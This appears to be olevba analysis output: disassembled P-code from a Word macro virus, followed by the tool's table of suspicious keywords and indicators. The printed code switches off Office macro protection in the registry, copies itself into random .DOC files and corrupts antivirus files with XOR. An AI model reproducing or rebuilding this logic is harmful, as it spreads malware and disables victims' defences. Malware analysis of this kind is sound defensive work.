' 	ArgsLd Chr 0x0001 
' 	Ld Application 
' 	MemLd Options 
' 	MemSt VirusProtection 
' Line #121:
' 	EndSub 
' Line #122:
' 	FuncDefn (Private Function Gds(id_FFFE As Byte) As Byte)
' Line #123:
' 	Dim (Const) 
' 	LitStr 0x0002 ":\"
' 	VarDefn Rt
' Line #124:
' 	Dim 
' 	VarDefn FileNum (As Integer)
' Line #125:
' 	Dim 
' 	VarDefn St (As String)
' Line #126:
' 	Dim 
' 	VarDefn i (As Byte)
' 	VarDefn k (As Byte)
' Line #127:
' 	OnError Ext 
' Line #128:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x001B 
' 	For 
' Line #129:
' 	LitDI2 0x0042 
' 	Ld i 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Ld Rt 
' 	Concat 
' 	LitDI2 0x0060 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St St 
' Line #130:
' 	Ld Friend 
' 	St FileNum 
' Line #131:
' 	Ld St 
' 	Ld FileNum 
' 	Sharp 
' 	LitDefault 
' 	Open (For Binary)
' Line #132:
' 	Ld FileNum 
' 	Sharp 
' 	Close 0x0001 
' Line #133:
' 	Ld St 
' 	ArgsCall Kill 0x0001 
' Line #134:
' 	Ld k 
' 	LitDI2 0x0001 
' 	Add 
' 	St k 
' Line #135:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #136:
' 	Label Ext 
' Line #137:
' 	Ld k 
' 	St Gds 
' Line #138:
' 	EndFunc 
' Line #139:
' 	FuncDefn (Private Function Rdd(ByVal Path As String, id_FFFE As String) As String)
' Line #140:
' 	Dim (Const) 
' 	LitStr 0x0003 "*.*"
' 	VarDefn Maska
' Line #141:
' 	Dim 
' 	VarDefn n (As Integer)
' 	VarDefn i (As Integer)
' Line #142:
' 	Dim 
' 	LitDI2 0x0001 
' 	LitDI2 0x0FA0 
' 	VarDefn Buf (As String)
' Line #143:
' 	Dim 
' 	VarDefn FindNmi (As String)
' Line #144:
' 	LitDI2 0x0000 
' 	St n 
' Line #145:
' 	LitDI2 0x0001 
' 	St i 
' Line #146:
' 	Ld Path 
' 	LitDI2 0x0001 
' 	ArgsLd Right 0x0002 
' 	LitStr 0x0001 "\"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld Path 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	St Path 
' 	EndIf 
' Line #147:
' 	OnError Errs 
' Line #148:
' 	Ld Path 
' 	LitDI2 0x0017 
' 	ArgsLd Dir 0x0002 
' 	St FindNmi 
' Line #149:
' 	Ld FindNmi 
' 	LitStr 0x0000 ""
' 	Ne 
' 	DoWhile 
' Line #150:
' 	Ld Path 
' 	Ld FindNmi 
' 	Concat 
' 	ArgsLd GetAttr 0x0001 
' 	Ld vbDirectory 
' 	And 
' 	Paren 
' 	Ld vbDirectory 
' 	Eq 
' 	IfBlock 
' Line #151:
' 	Ld FindNmi 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "."
' 	Ne 
' 	IfBlock 
' Line #152:
' 	Ld n 
' 	LitDI2 0x0001 
' 	Add 
' 	St n 
' Line #153:
' 	Ld FindNmi 
' 	Ld i 
' 	ArgsSt Buf 0x0001 
' Line #154:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #155:
' 	EndIfBlock 
' Line #156:
' 	EndIfBlock 
' Line #157:
' 	Ld Dir 
' 	St FindNmi 
' Line #158:
' 	Loop 
' Line #159:
' 	Ld Path 
' 	Ld n 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	ArgsLd Buf 0x0001 
' 	Concat 
' 	ArgsLd UCase 0x0001 
' 	St Rdd 
' Line #160:
' 	Label Errs 
' Line #161:
' 	Ld n 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0000 ""
' 	St Rdd 
' 	EndIf 
' Line #162:
' 	EndFunc 
' Line #163:
' 	FuncDefn (Private Function Rdr(ByVal Path As String, id_FFFE As String) As String)
' Line #164:
' 	Dim (Const) 
' 	LitStr 0x0001 ":"
' 	VarDefn Root
' Line #165:
' 	Dim 
' 	VarDefn tmp (As String)
' Line #166:
' 	Dim 
' 	VarDefn i (As Integer)
' Line #167:
' 	Dim 
' 	VarDefn GetRandom (As Integer)
' Line #168:
' 	Dim 
' 	VarDefn RandStep (As Integer)
' Line #169:
' 	LitDI2 0x03E9 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St GetRandom 
' Line #170:
' 	LitDI2 0x0000 
' 	St RandStep 
' Line #171:
' Line #172:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000A 
' 	For 
' Line #173:
' 	Ld Path 
' 	ArgsLd Rdd 0x0001 
' 	St tmp 
' Line #174:
' 	Ld tmp 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld tmp 
' 	St Path 
' 	EndIf 
' Line #175:
' 	Ld tmp 
' 	LitStr 0x0000 ""
' 	Eq 
' 	Paren 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #176:
' 	LitStr 0x0000 ""
' 	St Rdr 
' Line #177:
' 	ExitFunc 
' Line #178:
' 	EndIfBlock 
' Line #179:
' 	Ld tmp 
' 	LitStr 0x0000 ""
' 	Eq 
' 	Paren 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #180:
' 	Ld Path 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	St Rdr 
' Line #181:
' 	ExitFunc 
' Line #182:
' 	EndIfBlock 
' Line #183:
' 	Ld RandStep 
' 	SelectCase 
' Line #184:
' 	LitDI2 0x0000 
' 	LitDI2 0x00C8 
' 	CaseTo 
' 	CaseDone 
' Line #185:
' 	Ld RandStep 
' 	LitDI2 0x00C8 
' 	Add 
' 	St RandStep 
' Line #186:
' 	LitDI2 0x0190 
' 	LitDI2 0x0258 
' 	CaseTo 
' 	CaseDone 
' Line #187:
' 	Ld RandStep 
' 	LitDI2 0x0064 
' 	Add 
' 	St RandStep 
' Line #188:
' 	LitDI2 0x02BC 
' 	LitDI2 0x0384 
' 	CaseTo 
' 	CaseDone 
' Line #189:
' 	Ld RandStep 
' 	LitDI2 0x0032 
' 	Add 
' 	St RandStep 
' Line #190:
' 	EndSelect 
' Line #191:
' 	Ld RandStep 
' 	Ld GetRandom 
' 	Ge 
' 	IfBlock 
' Line #192:
' 	Ld Path 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	St Rdr 
' Line #193:
' 	ExitFunc 
' Line #194:
' 	EndIfBlock 
' Line #195:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #196:
' 	EndFunc 
' Line #197:
' 	FuncDefn (Private Function Rfe(ByVal Path As String, Maska As String, id_FFFE As String) As String)
' Line #198:
' 	Dim 
' 	VarDefn n (As Integer)
' 	VarDefn i (As Integer)
' Line #199:
' 	Dim 
' 	LitDI2 0x0001 
' 	LitDI2 0x0FA0 
' 	VarDefn Buf (As String)
' Line #200:
' 	Dim 
' 	VarDefn FindNmi (As String)
' Line #201:
' 	LitDI2 0x0000 
' 	St n 
' Line #202:
' 	LitDI2 0x0001 
' 	St i 
' Line #203:
' 	Ld Path 
' 	Ld Maska 
' 	Concat 
' 	St Path 
' Line #204:
' 	OnError Errs 
' Line #205:
' 	Ld Path 
' 	LitDI2 0x0007 
' 	ArgsLd Dir 0x0002 
' 	St FindNmi 
' Line #206:
' 	Ld FindNmi 
' 	LitStr 0x0000 ""
' 	Ne 
' 	DoWhile 
' Line #207:
' 	Ld n 
' 	LitDI2 0x0001 
' 	Add 
' 	St n 
' Line #208:
' 	Ld FindNmi 
' 	Ld i 
' 	ArgsSt Buf 0x0001 
' Line #209:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #210:
' 	Ld Dir 
' 	St FindNmi 
' Line #211:
' 	Loop 
' Line #212:
' 	Ld n 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsLd Buf 0x0001 
' 	ArgsLd UCase 0x0001 
' 	St Rfe 
' Line #213:
' 	Label Errs 
' Line #214:
' 	Ld n 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0000 ""
' 	St Rfe 
' 	EndIf 
' Line #215:
' 	EndFunc 
' Line #216:
' 	FuncDefn (Private Sub Dfe(Path As String))
' Line #217:
' 	Dim 
' 	VarDefn Attr (As Integer)
' Line #218:
' 	Dim 
' 	VarDefn Siz (As Long)
' 	VarDefn Cmp (As Long)
' Line #219:
' 	Dim 
' 	VarDefn FileNum (As Integer)
' Line #220:
' 	Dim 
' 	VarDefn i (As Integer)
' Line #221:
' 	Dim 
' 	VarDefn Ofs (As Byte)
' Line #222:
' 	OnError Ends 
' Line #223:
' 	Ld Path 
' 	ArgsLd FileLen 0x0001 
' 	St Siz 
' Line #224:
' 	Ld Siz 
' 	LitDI2 0x000B 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #225:
' 	Ld Path 
' 	ArgsLd GetAttr 0x0001 
' 	St Attr 
' Line #226:
' 	Ld Path 
' 	LitDI2 0x0000 
' 	ArgsCall SetAttr 0x0002 
' Line #227:
' 	Ld Friend 
' 	St FileNum 
' Line #228:
' 	Ld Path 
' 	Ld FileNum 
' 	Sharp 
' 	LitDefault 
' 	Open (For Binary)
' Line #229:
' 	Ld Siz 
' 	LitDI2 0x7FFB 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0009 
' 	St Ofs 
' 	Else 
' 	BoSImplicit 
' 	LitDI2 0x0003 
' 	St Ofs 
' 	EndIf 
' Line #230:
' 	Ld FileNum 
' 	Sharp 
' 	Ld Siz 
' 	Ld Ofs 
' 	Sub 
' 	Ld Cmp 
' 	GetRec 
' Line #231:
' 	Ld Siz 
' 	Ld Cmp 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #232:
' 	Ld Siz 
' 	St Cmp 
' Line #233:
' 	Ld Siz 
' 	LitDI2 0x7FFB 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x7FFB 
' 	St Siz 
' 	EndIf 
' Line #234:
' 	LitDI2 0x0001 
' 	Ld Siz 
' 	RedimAs Buf 0x0001 (As Byte)
' Line #235:
' 	LitDI2 0x0064 
' 	UMi 
' 	Paren 
' 	ArgsCall Rnd 0x0001 
' Line #236:
' 	Ld FileNum 
' 	Sharp 
' 	LitDI2 0x000A 
' 	Ld Buf 
' 	GetRec 
' Line #237:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Siz 
' 	For 
' Line #238:
' 	Ld i 
' 	ArgsLd Buf 0x0001 
' 	LitDI2 0x00FF 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0000 
' 	Add 
' 	FnInt 
' 	Xor 
' 	Ld i 
' 	ArgsSt Buf 0x0001 
' Line #239:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #240:
' 	Ld FileNum 
' 	Sharp 
' 	LitDI2 0x000A 
' 	Ld Buf 
' 	PutRec 
' Line #241:
' 	Ld Cmp 
' 	Ld Ofs 
' 	Add 
' 	St Cmp 
' Line #242:
' 	Ld FileNum 
' 	Sharp 
' 	Ld Cmp 
' 	Ld Ofs 
' 	Sub 
' 	Ld Cmp 
' 	PutRec 
' Line #243:
' 	Ld FileNum 
' 	Sharp 
' 	Close 0x0001 
' Line #244:
' 	Ld Path 
' 	Ld Attr 
' 	ArgsCall SetAttr 0x0002 
' Line #245:
' 	Label Ends 
' Line #246:
' 	EndSub 
' Line #247:
' 	FuncDefn (Private Sub Rcy(Sours As String))
' Line #248:
' 	Dim 
' 	VarDefn Fls (As String)
' 	VarDefn DirR (As String)
' Line #249:
' 	Dim 
' 	VarDefn k (As Long)
' 	VarDefn Er (As Integer)
' Line #250:
' 	OnError YYY 
' Line #251:
' 	Do 
' Line #252:
' 	ArgsLd Gds 0x0000 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	LitDI2 0x0042 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	ArgsLd Rdr 0x0001 
' 	St DirR 
' Line #253:
' 	Ld DirR 
' 	LitStr 0x0003 "*.*"
' 	ArgsLd Rfe 0x0002 
' 	St Fls 
' Line #254:
' 	Ld Er 
' 	LitDI2 0x0001 
' 	Add 
' 	St Er 
' Line #255:
' 	Ld Er 
' 	LitDI2 0x000A 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #256:
' 	Ld Fls 
' 	LitStr 0x0000 ""
' 	Ne 
' 	LoopUntil 
' Line #257:
' 	LitDI2 0x0001 
' 	Ld Fls 
' 	LitStr 0x0001 "."
' 	LitDI2 0x0001 
' 	FnInStr4 
' 	St k 
' Line #258:
' 	Ld k 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #259:
' 	Ld Fls 
' 	Ld Fls 
' 	FnLen 
' 	Ld Fls 
' 	FnLen 
' 	Ld k 
' 	Sub 
' 	Paren 
' 	Sub 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	St Fls 
' Line #260:
' 	EndIfBlock 
' Line #261:
' 	Ld Fls 
' 	LitStr 0x0004 ".DOC"
' 	Concat 
' 	St Fls 
' Line #262:
' 	Ld DirR 
' 	Ld Fls 
' 	Concat 
' 	St DirR 
' Line #263:
' 	Ld Sours 
' 	Ld DirR 
' 	LitDI2 0x0000 
' 	ArgsLd CopyFile& 0x0003 
' 	St k 
' Line #264:
' 	Label YYY 
' Line #265:
' 	EndSub 
' Line #266:
' 	FuncDefn (Private Sub Dpio())
' Line #267:
' 	Dim (Const) 
' 	LitStr 0x001B "\Software\Microsoft\Office\"
' 	VarDefn Path
' Line #268:
' 	Dim (Const) 
' 	LitStr 0x0004 "8.0\"
' 	VarDefn Ver
' Line #269:
' 	Dim (Const) 
' 	LitStr 0x0012 "New User Settings\"
' 	VarDefn NewUse
' Line #270:
' 	Dim (Const) 
' 	LitStr 0x0009 "\.Default"
' 	VarDefn Def
' Line #271:
' 	Dim 
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	VarDefn Keys (As String)
' Line #272:
' 	LitStr 0x0012 "HKEY_LOCAL_MACHINE"
' 	LitDI2 0x0001 
' 	ArgsSt Keys 0x0001 
' Line #273:
' 	LitStr 0x0011 "HKEY_CURRENT_USER"
' 	LitDI2 0x0002 
' 	ArgsSt Keys 0x0001 
' Line #274:
' 	LitStr 0x000A "HKEY_USERS"
' 	LitDI2 0x0003 
' 	ArgsSt Keys 0x0001 
' Line #275:
' 	Dim 
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	VarDefn Dis (As String)
' Line #276:
' 	LitStr 0x001A "EnableMacroVirusProtection"
' 	LitDI2 0x0001 
' 	ArgsSt Dis 0x0001 
' Line #277:
' 	LitStr 0x0008 "Options6"
' 	LitDI2 0x0002 
' 	ArgsSt Dis 0x0001 
' Line #278:
' 	LitStr 0x0014 "MacroVirusProtection"
' 	LitDI2 0x0003 
' 	ArgsSt Dis 0x0001 
' Line #279:
' 	Dim 
' 	LitDI2 0x0001 
' 	LitDI2 0x0006 
' 	VarDefn AddId (As String)
' Line #280:
' 	LitStr 0x000C "Word\Options"
' 	LitDI2 0x0001 
' 	ArgsSt AddId 0x0001 
' Line #281:
' 	LitStr 0x0015 "Excel\Microsoft Excel"
' 	LitDI2 0x0002 
' 	ArgsSt AddId 0x0001 
' Line #282:
' 	LitStr 0x0012 "PowerPoint\Options"
' 	LitDI2 0x0003 
' 	ArgsSt AddId 0x0001 
' Line #283:
' 	LitStr 0x0010 "Word\7.0\Options"
' 	LitDI2 0x0004 
' 	ArgsSt AddId 0x0001 
' Line #284:
' 	LitStr 0x0019 "Excel\7.0\Microsoft Excel"
' 	LitDI2 0x0005 
' 	ArgsSt AddId 0x0001 
' Line #285:
' 	LitStr 0x0016 "PowerPoint\7.0\Options"
' 	LitDI2 0x0006 
' 	ArgsSt AddId 0x0001 
' Line #286:
' 	Dim 
' 	VarDefn i (As Integer)
' Line #287:
' 	Dim 
' 	VarDefn k (As Integer)
' Line #288:
' 	Dim 
' 	VarDefn x (As Integer)
' Line #289:
' 	Dim 
' 	VarDefn Use (As String)
' Line #290:
' 	OnError (Resume Next) 
' Line #291:
' 	StartWithExpr 
' 	Ld System 
' 	With 
' Line #292:
' 	LitStr 0x0000 ""
' 	LitDI2 0x0001 
' 	ArgsLd Keys 0x0001 
' 	LitStr 0x0021 "\System\CurrentControlSet\control"
' 	Concat 
' 	LitStr 0x000C "Current User"
' 	ArgsMemLdWith PrivateProfileString 0x0003 
' 	St Use 
' Line #293:
' 	Ld Use 
' 	LitStr 0x0008 ".Default"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0003 
' 	St x 
' 	Else 
' 	BoSImplicit 
' 	LitDI2 0x0002 
' 	St x 
' 	EndIf 
' Line #294:
' 	StartForVariable 
' 	Ld k 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld x 
' 	For 
' Line #295:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	For 
' Line #296:
' 	Ld k 
' 	SelectCase 
' Line #297:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' Line #298:
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0000 ""
' 	Ld k 
' 	ArgsLd Keys 0x0001 
' 	Ld Path 
' 	Concat 
' 	Ld Ver 
' 	Concat 
' 	Ld NewUse 
' 	Concat 
' 	Ld i 
' 	ArgsLd AddId 0x0001 
' 	Concat 
' 	Ld i 
' 	ArgsLd Dis 0x0001 
' 	ArgsMemStWith PrivateProfileString 0x0003 
' Line #299:
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0000 ""
' 	Ld k 
' 	ArgsLd Keys 0x0001 
' 	LitStr 0x0014 "\Software\Microsoft\"
' 	Concat 
' 	Ld NewUse 
' 	Concat 
' 	Ld i 
' 	LitDI2 0x0003 
' 	Add 
' 	ArgsLd AddId 0x0001 
' 	Concat 
' 	Ld i 
' 	ArgsLd Dis 0x0001 
' 	ArgsMemStWith PrivateProfileString 0x0003 
' Line #300:
' 	LitDI2 0x0002 
' 	Case 
' 	CaseDone 
' Line #301:
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0000 ""
' 	Ld k 
' 	ArgsLd Keys 0x0001 
' 	Ld Path 
' 	Concat 
' 	Ld Ver 
' 	Concat 
' 	Ld i 
' 	ArgsLd AddId 0x0001 
' 	Concat 
' 	Ld i 
' 	ArgsLd Dis 0x0001 
' 	ArgsMemStWith PrivateProfileString 0x0003 
' Line #302:
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0000 ""
' 	Ld k 
' 	ArgsLd Keys 0x0001 
' 	LitStr 0x0014 "\Software\Microsoft\"
' 	Concat 
' 	Ld i 
' 	LitDI2 0x0003 
' 	Add 
' 	ArgsLd AddId 0x0001 
' 	Concat 
' 	Ld i 
' 	ArgsLd Dis 0x0001 
' 	ArgsMemStWith PrivateProfileString 0x0003 
' Line #303:
' 	LitDI2 0x0003 
' 	Case 
' 	CaseDone 
' Line #304:
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0000 ""
' 	Ld k 
' 	ArgsLd Keys 0x0001 
' 	Ld Def 
' 	Concat 
' 	Ld Path 
' 	Concat 
' 	Ld Ver 
' 	Concat 
' 	Ld i 
' 	ArgsLd AddId 0x0001 
' 	Concat 
' 	Ld i 
' 	ArgsLd Dis 0x0001 
' 	ArgsMemStWith PrivateProfileString 0x0003 
' Line #305:
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0000 ""
' 	Ld k 
' 	ArgsLd Keys 0x0001 
' 	Ld Def 
' 	Concat 
' 	LitStr 0x0014 "\Software\Microsoft\"
' 	Concat 
' 	Ld i 
' 	LitDI2 0x0003 
' 	Add 
' 	ArgsLd AddId 0x0001 
' 	Concat 
' 	Ld i 
' 	ArgsLd Dis 0x0001 
' 	ArgsMemStWith PrivateProfileString 0x0003 
' Line #306:
' 	EndSelect 
' Line #307:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #308:
' 	StartForVariable 
' 	Ld k 
' 	EndForVariable 
' 	NextVar 
' Line #309:
' 	EndWith 
' Line #310:
' 	EndSub 
' Line #311:
' 	FuncDefn (Private Sub Asd())
' Line #312:
' 	Dim (Const) 
' 	LitStr 0x002E "\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
' 	VarDefn Path1
' Line #313:
' 	Dim (Const) 
' 	LitStr 0x002D "\System\CurrentControlSet\Services\VxD\SpIDer"
' 	VarDefn Path2
' Line #314:
' 	Dim (Const) 
' 	LitStr 0x0012 "HKEY_LOCAL_MACHINE"
' 	VarDefn Key
' Line #315:
' 	Dim (Const) 
' 	LitStr 0x000A "RUNDLL.EXE"
' 	VarDefn RN
' Line #316:
' 	Dim 
' 	VarDefn Nmi (As String)
' Line #317:
' 	Dim 
' 	VarDefn ProgPath (As String)
' Line #318:
' 	OnError (Resume Next) 
' Line #319:
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0049 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0044 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Nmi 
' Line #320:
' 	StartWithExpr 
' 	Ld System 
' 	With 
' Line #321:
' 	LitStr 0x0000 ""
' 	Ld Key 
' 	Ld Path1 
' 	Concat 
' 	Ld Nmi 
' 	ArgsMemLdWith PrivateProfileString 0x0003 
' 	St ProgPath 
' Line #322:
' 	Ld ProgPath 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Paren 
' 	Ld ProgPath 
' 	Ld RN 
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #323:
' 	Ld RN 
' 	LitStr 0x0000 ""
' 	Ld Key 
' 	Ld Path1 
' 	Concat 
' 	Ld Nmi 
' 	ArgsMemStWith PrivateProfileString 0x0003 
' Line #324:
' 	LitStr 0x0004 "*IOS"
' 	LitStr 0x0000 ""
' 	Ld Key 
' 	Ld Path2 
' 	Concat 
' 	LitStr 0x0009 "StaticVxD"
' 	ArgsMemStWith PrivateProfileString 0x0003 
' Line #325:
' 	Ld ProgPath 
' 	ArgsLd Ptd 0x0001 
' 	St ProgPath 
' Line #326:
' 	Ld ProgPath 
' 	LitStr 0x0005 "*.EXE"
' 	Concat 
' 	LitDI2 0x0007 
' 	ArgsLd Dir 0x0002 
' 	St Nmi 
' Line #327:
' 	Ld Nmi 
' 	LitStr 0x0000 ""
' 	Ne 
' 	DoWhile 
' Line #328:
' 	Ld ProgPath 
' 	Ld Nmi 
' 	Concat 
' 	Paren 
' 	ArgsCall Dfe 0x0001 
' Line #329:
' 	Ld Dir 
' 	St Nmi 
' Line #330:
' 	Loop 
' Line #331:
' 	Ld ProgPath 
' 	LitStr 0x0005 "*.VDB"
' 	Concat 
' 	LitDI2 0x0007 
' 	ArgsLd Dir 0x0002 
' 	St Nmi 
' Line #332:
' 	Ld Nmi 
' 	LitStr 0x0000 ""
' 	Ne 
' 	DoWhile 
' Line #333:
' 	Ld ProgPath 
' 	Ld Nmi 
' 	Concat 
' 	Paren 
' 	ArgsCall Dfe 0x0001 
' Line #334:
' 	Ld Dir 
' 	St Nmi 
' Line #335:
' 	Loop 
' Line #336:
' 	EndIfBlock 
' Line #337:
' 	EndWith 
' Line #338:
' 	EndSub 
' Line #339:
' 	FuncDefn (Private Function Ptd(Path As String, id_FFFE As String) As String)
' Line #340:
' 	Dim 
' 	VarDefn tmp (As String)
' Line #341:
' 	Dim 
' 	VarDefn i (As Long)
' 	VarDefn k (As Long)
' Line #342:
' 	OnError Sti 
' Line #343:
' 	Ld Path 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo Sti 
' 	EndIf 
' Line #344:
' 	Ld Path 
' 	FnLen 
' 	St k 
' Line #345:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	Ld k 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	UMi 
' 	ForStep 
' Line #346:
' 	Ld Path 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "\"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFor 
' 	EndIf 
' Line #347:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #348:
' 	Ld Path 
' 	Ld i 
' 	ArgsLd LBound 0x0002 
' 	St Ptd 
' Line #349:
' 	ExitFunc 
' Line #350:
' 	Label Sti 
' Line #351:
' 	LitStr 0x0000 ""
' 	St Ptd 
' Line #352:
' 	EndFunc 
' Line #353:
' Line #354:
' Line #355:
' Line #356:
' Line #357:
' Line #358:
' Line #359:
' Line #360:
' Line #361:
' Line #362:
' Line #363:
' Line #364:
' Line #365:
' Line #366:
' Line #367:
' Line #368:
' Line #369:
' Line #370:
' Line #371:
' Line #372:
' Line #373:
' Line #374:
' Line #375:
' Line #376:
' Line #377:
' Line #378:
' Line #379:
' Line #380:
' Line #381:
' Line #382:
' Line #383:
' Line #384:
' Line #385:
' Line #386:
' Line #387:
' Line #388:
' Line #389:
' Line #390:
' Line #391:
' Line #392:
' Line #393:
' Line #394:
' Line #395:
' Line #396:
' Line #397:
' Line #398:
' Line #399:
' Line #400:
' Line #401:
' Line #402:
' Line #403:
' Line #404:
' Line #405:
' Line #406:
' Line #407:
' Line #408:
' Line #409:
' Line #410:
' Line #411:
' Line #412:
' Line #413:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|CopyFile            |May copy a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |VBADLG.DLL          |Executable file name                         |
|IOC       |RUNDLL.EXE          |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

